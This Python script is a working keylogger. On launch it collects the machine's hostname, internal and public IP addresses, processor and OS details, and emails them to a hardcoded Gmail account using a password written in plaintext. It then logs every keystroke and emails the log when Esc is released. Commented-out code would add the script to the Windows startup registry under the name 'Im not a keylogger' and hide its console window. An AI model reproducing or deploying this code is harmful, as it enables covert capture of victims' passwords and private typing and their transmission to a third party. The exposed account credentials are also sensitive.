#!/usr/bin/env python3

"""
██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
"""

# --------------------------------------------------------------------------Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

from pynput.keyboard import Key, Listener

import os
from datetime import datetime
import os.path

import urllib.request

from winreg import *
import sys

import time

# -------------------------------------------------------------------------Add file to startup registry
# def addStartup():
#     fp = os.path.dirname(os.path.realpath(__file__))
#     file_name = sys.argv[0].split("\\")[-1]
#     new_file_path = fp + "\\" + file_name
#     keyVal = r"Software\Microsoft\Windows\CurrentVersion\Run"
#     key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
#     SetValueEx(key2change, "Im not a keylogger", 0, REG_SZ, new_file_path)


# def hideconsole():
#     import win32console
#     import win32gui

#     win = win32console.GetConsoleWindow()
#     win32gui.ShowWindow(win, 0)


# addStartup()
# hideconsole()


# ------------------------------------------------------------------------Sending Mail


def sendmail(subject, filename):
    mailaddress = "viditsirohi@gmail.com"

    msg = MIMEMultipart()
    msg["From"] = mailaddress
    msg["To"] = mailaddress
    msg["Subject"] = subject

    attachment = open(
        os.path.dirname(os.path.realpath(__file__)) + "\\" + filename, "rb"
    )

    base_inst = MIMEBase("application", "octet-stream")
    base_inst.set_payload((attachment).read())

    encoders.encode_base64(base_inst)
    base_inst.add_header("Content-Disposition", "attachment; filename= %s" % filename)

    msg.attach(base_inst)

    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(mailaddress, "Gmail@14!")

    text = msg.as_string()

    s.sendmail(mailaddress, mailaddress, text)

    s.quit()


# -------------------------------------------------------------------------Sys info

try:
    f = open("sysinfo.txt", "a")
    f.close
except:
    f = open("sysinfo.txt", "w")
    f.close


def sys_info():
    with open("sysinfo.txt", "a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            ext_ip = urllib.request.urlopen("https://ident.me").read().decode("utf8")
            f.write("public IP: " + ext_ip + "\n")
        except Exception:
            f.write("couldn't get ext IP \n")

        f.write("processor: " + (platform.processor()) + "\n")
        f.write(
            "System: " + platform.system() + "\nVersion: " + platform.version() + "\n"
        )
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("internal IP: " + IPaddr + "\n")


sys_info()
sendmail("System information", "sysinfo.txt")


# --------------------------------------------------------------------------Key Logger
starttime = time.time()
interval = 60
count = 0
keys = []


def Keylogger():
    try:
        f = open("log.txt", "a")
        f.close
    except:
        f = open("log.txt", "w")
        f.close

    with open("log.txt", "a") as f:
        f.write("{0} \n\n".format(datetime.now()))

    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1

        if count >= 20:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open("log.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k == "Key.space":
                    f.write(" ")
                elif k == "Key.backspace":
                    f.write("<bksp>")
                elif k == "key.enter":
                    f.write("\n")
                elif k == "Key.left":
                    f.write("<lftarw>")
                elif k == "Key.right":
                    f.write("<rtarw>")
                elif k == "Key.down":
                    f.write("<dwnarw>")
                elif k == "Key.up":
                    f.write("<uparw>")
                elif k == "Key.ctrl_l":
                    f.write("<ctrl_l>")
                elif k == "Key.ctrl_r":
                    f.write("<ctrl_r>")
                elif k == "Key.tab":
                    f.write("<tab>")
                elif k == "Key.caps_lock":
                    f.write("<caps_lock>")
                elif k == "Key.shift":
                    f.write("<shift>")
                elif k == "Key.shift_r":
                    f.write("<shift_r>")
                elif k == "Key.ctrl_l":
                    f.write("<ctrl_l>")
                elif k == "Key.ctrl_r":
                    f.write("<ctrl_r`~>")
                elif k == "Key.f1":
                    f.write("<F1>")
                elif k == "Key.f2":
                    f.write("<F2>")
                elif k == "Key.f3":
                    f.write("<F3>")
                elif k == "Key.f4":
                    f.write("<F4>")
                elif k == "Key.f5":
                    f.write("<F5>")
                elif k == "Key.f6":
                    f.write("<F6>")
                elif k == "Key.f7":
                    f.write("<F7>")
                elif k == "Key.f8":
                    f.write("<F8>")
                elif k == "Key.f9":
                    f.write("<F9>")
                elif k == "Key.f10":
                    f.write("<F10>")
                elif k == "Key.f11":
                    f.write("<F11>")
                elif k == "Key.f12":
                    f.write("<F12>")
                elif k == "Key.print_screen":
                    f.write("<prtsc>")
                elif k == "Key.scroll_lock":
                    f.write("<scrlk>")
                elif k == "Key.pause":
                    f.write("<pause>")
                elif k == "Key.home":
                    f.write("<home>")
                elif k == "Key.end":
                    f.write("<end>")
                elif k == "Key.delete":
                    f.write("<delete>")
                elif k == "Key.insert":
                    f.write("<insert>")
                elif k == "Key.page_up":
                    f.write("<page_up>")
                elif k == "Key.page_down":
                    f.write("<page_down>")
                else:
                    f.write(str(k))

    def on_release(key):
        if key == Key.esc:
            with open("log.txt", "a") as f:
                f.write("\n\n")
            sendmail("Keylogger", "log.txt")
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


Keylogger()
